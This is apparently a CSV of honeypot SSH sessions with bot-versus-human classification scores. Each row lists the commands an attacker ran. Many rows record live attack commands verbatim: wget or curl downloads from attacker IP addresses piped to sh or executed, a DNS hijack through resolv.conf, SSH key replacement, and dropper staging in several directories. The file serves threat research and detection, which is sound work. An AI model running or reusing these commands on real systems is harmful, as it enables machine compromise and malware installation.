session,combo_key,label_pdf_quantile,label_tailtest,label_posterior,p_human_tail,p_human_posterior,n_pairs,n_commands,first_cmd,last_cmd,top_commands,logp_human_global
1da09ec271ab,False_False_False,non_human_like,non_human_like,bot_posterior_high,7.017542161813495e-07,3.338525537676069e-10,5,7,ifconfig,echo Hi | cat -n,ifconfig | uname -a | cat /proc/cpuinfo | ps | grep '[Mm]iner' | ps -ef | grep '[Mm]iner' | ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect... | echo Hi | cat -n,-17.39079007726285
87478fda1ff1,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.7997396441231073e-80,7,9,>/home/.z && cd /home/; rm -rf .i; cp /bin/echo .i; >.i; chmod 777 .i;,wget http://194.31.98.244/ssh/new/x86 -O-> .i; ./.i scan.x86; >.i;,>/home/.z && cd /home/; rm -rf .i; cp /bin/echo .i; >.i; chmod 777 .i; | >/.z && cd /; rm -rf .i; cp /bin/echo .i; >.i; chmod 777 .i; | >/tmp/.z && cd /tmp/; rm -rf .i; cp /bin/echo .i; >.i; chmod 777 .i; | >/var/tmp/.z && cd /var/tmp/; rm -rf .i; cp /bin/echo .i; >.i; chmod 777 .i; | >/dev/netslink/.z && cd /dev/netslink/; rm -rf .i; cp /bin/echo .i; >.i; chmod 777 .i; | >/dev/.z && cd /dev/; rm -rf .i; cp /bin/echo .i; >.i; chmod 777 .i; | >/var/.z && cd /var/; rm -rf .i; cp /bin/echo .i; >.i; chmod 777 .i; | >/etc/.z && cd /etc/; rm -rf .i; cp /bin/echo .i; >.i; chmod 777 .i;,-186.4682748799693
d24df53ace96,False_False_False,non_human_like,non_human_like,bot_posterior_high,9.314815585526047e-11,2.563587742031828e-16,6,7,ifconfig,echo Hi | cat -n,ifconfig | uname -a | cat /proc/cpuinfo | ps | grep '[Mm]iner' | ps -ef | grep '[Mm]iner' | ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect... | echo Hi | cat -n,-26.73486173172089
234a21040335,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,6.165291497977299e-55,3,5,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | echo 'nameserver 95.214.27.202'>/etc/resolv.conf; | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-119.95144296104506
49724f8f5eec,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,7.008680212923032e-41,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-79.18421985524202
467795045ede,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,4.642359845567113e-43,4,6,sh,wget http://2.58.149.116/w -O- | sh; curl http://2.58.149.116/c -O- | sh,sh | enable | shell | debug shell | cmd | wget http://2.58.149.116/w -O- | sh; curl http://2.58.149.116/c -O- | sh,-92.33159981747116
08161d5b2282,False_False_False,non_human_like,non_human_like,bot_posterior_high,3.6926017799032707e-13,1.6630663042935199e-18,6,7,ifconfig,echo Hi | cat -n,ifconfig | uname -a | cat /proc/cpuinfo | ps | grep '[Mm]iner' | ps -ef | grep '[Mm]iner' | ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect... | echo Hi | cat -n,-32.45497123828289
6fba76f241a5,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,2.711077765900687e-54,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-109.80599914865104
8d4bc1169d9e,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.5591339079514469e-63,10,12,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM...",wget http://109.206.243.207/ssh/x86_64 -O-> .i; ./.i scan.ssh.x86_64; >.i;,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM... | cp /bin/echo /home/.z && >/home/.z && cd /home/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /.z && >/.z && cd /; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /tmp/.z && >/tmp/.z && cd /tmp/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /var/tmp/.z && >/var/tmp/.z && cd /var/tmp/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /dev/netslink/.z && >/dev/netslink/.z && cd /dev/netslink/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; ch... | cp /bin/echo /dev/.z && >/dev/.z && cd /dev/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /var/.z && >/var/.z && cd /var/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d;",-143.48631397582557
9f8c23a5145e,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,2.411689175791459e-72,8,11,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM...",wget http://109.206.243.207/ssh/x86_64 -O-> .i || busybox wget http://109.206.243.207/ssh/x86_64 -O-> .i || wd1 http://1...,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM... | cp /bin/echo /home/.z && >/home/.z && cd /home/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /tmp/.z && >/tmp/.z && cd /tmp/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /var/tmp/.z && >/var/tmp/.z && cd /var/tmp/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /home/$USER/.z && >/home/$USER/.z && cd /home/$USER/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 77... | cp /bin/echo /dev/.z && >/dev/.z && cd /dev/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /var/.z && >/var/.z && cd /var/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /etc/.z && >/etc/.z && cd /etc/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d;",-157.28858254371357
31e87a3149c1,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,3.759532127720498e-46,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-100.05977153658648
f9e04f766ca6,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.5069203996760258e-53,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-107.923532963606
38c00655cdc3,False_False_False,non_human_like,non_human_like,bot_posterior_high,1.207201005826164e-11,3.438746176610293e-17,6,7,ifconfig,echo Hi | cat -n,ifconfig | uname -a | cat /proc/cpuinfo | ps | grep '[Mm]iner' | ps -ef | grep '[Mm]iner' | ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect... | echo Hi | cat -n,-28.852592470022486
bcb0631ee81e,False_False_False,non_human_like,non_human_like,bot_posterior_high,7.438494264988549e-15,1.0981543816155858e-17,3,5,echo -e '\x79\x65\x73\x68\x65\x6c\x6f',cd //; wget http://2.58.149.116/x86_64 -O- > .f; ./.f s.x86_64; >.f; echo test,echo -e '\x79\x65\x73\x68\x65\x6c\x6f' | cat /bin/echo | cat /proc/mounts | cp /bin/echo //.f && >//.f && echo -e '\x67\x6f\x6f\x64\x77\x72\x69\x74\x65' && chmod 777 //.f; echo -e '\x63\x6d\x64\x6... | cd //; wget http://2.58.149.116/x86_64 -O- > .f; ./.f s.x86_64; >.f; echo test,-36.47129492293255
4f5e2df8fe91,False_False_False,non_human_like,non_human_like,bot_posterior_high,1.1102230246251563e-16,2.315253658539534e-19,5,7,ifconfig,echo Hi | cat -n,ifconfig | uname -a | cat /proc/cpuinfo | ps | grep '[Mm]iner' | ps -ef | grep '[Mm]iner' | ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect... | echo Hi | cat -n,-40.94903975234283
22d0f64fdf1d,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,4.306824858330475e-40,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-77.73107196876569
6d06b5672cf7,True_True_True,human_like,human_like,human_posterior_high,0.7524983026895924,0.9938292034886744,3,4,lscpu,apt update,lscpu | (wget -4 ti.4it.top/setup.sh -O setup.sh || curl -o setup.sh ti.4it.top/setup.sh) && bash setup.sh c0c5372c-202f-4e22-a4... | sudo su | apt update,-1.2816911421272803
3e28820470b7,True_True_True,human_like,human_like,human_posterior_high,0.4645681544100098,0.9311469954664446,12,13,w,ls,w | cat /proc/cpuinfo | w | cat /etc/passwd | ps x | ls -a | cd | cd ..,-2.121398543206513
d19eaa9436bb,True_True_True,human_like,human_like,human_posterior_high,0.4188282852938935,0.9482561783060576,10,11,ifconfig -a,ls -l,ifconfig -a | cat /etc/nas3 | cat /etc/hostname | /usr/bin/yes | 18.157.182.239 | ls /usr/bin | /usr/bin/vmstat | vmstat,-2.280384876264654
ebb026ea146d,True_True_True,human_like,human_like,human_posterior_high,0.5346984175986607,0.9756807697566204,4,5,w,w,w | uname -a | cat /proc/cpuinfo | passwd | w,-1.8971414168661012
51fa2a357e92,True_True_True,human_like,human_like,human_posterior_high,0.1506019688767184,0.9675237418896108,5,6,w,w,w | uname -a | ls | cat /proc/cpuinfo | passwd | w,-3.694457624075467
3fe70d416804,True_True_True,human_like,human_like,human_posterior_high,0.127335213112026,0.9085202957183436,5,6,w,uname -a,w | ls | cat /proc/cpuinfo | nproc | passwd | uname -a,-3.910575505439527
c45d41a91211,True_True_True,human_like,human_like,human_posterior_high,0.6207739209996903,0.9776644166616556,16,19,uptime,cat dscript <<EOF,uptime | uptime | cat /etc/hosts | ls -lrt | which | which uname | hostname | cat /etc/hostname,-1.6443179952777491
605a230627bc,True_True_True,human_like,human_like,human_posterior_high,0.2635423762998395,0.9464574200671356,18,20,unamer -a,cat /etc/poasswd,unamer -a | uname -a | ssh -v | ssh -V | cat /etc/hosts | scp | ls -lrt /usr/bin/ | w,-2.947230588813307
9fb0a0d7ade0,True_True_True,human_like,human_like,human_posterior_high,0.6883674591897915,0.9689089828482784,4,5,w,ps x,w | cat /proc/cpuinfo | passwd | w | ps x,-1.456369726488552
53459e703369,True_True_True,human_like,human_like,human_posterior_high,0.8007595260424095,0.981056274172858,8,9,"echo ""paul cox testing""",exit,"echo ""paul cox testing"" | cat /etc/hostname | echo $hostname | cat hostname | hostname | uname -a | ssh -V | cat etc/hostname",-1.1494964635101352
71d468e1469f,True_True_True,human_like,human_like,human_posterior_high,0.1354458878430435,0.9666143667785396,3,4,ifconfig,echo Hi | cat -n,ifconfig | uname -a | cat /proc/cpuinfo | echo Hi | cat -n,-3.831401157057683
d0325f08b21f,True_True_False,human_like,human_like,ambiguous,0.136019697558238,0.386717427069383,39,42,date,ls -l /usr/bin/yes,date | ls -l /usr | ls -l /usr/bin | file | xstat | cat /usr/bin/yes | /usr/bin/yes | ls /usr/bin,-3.825966306421817
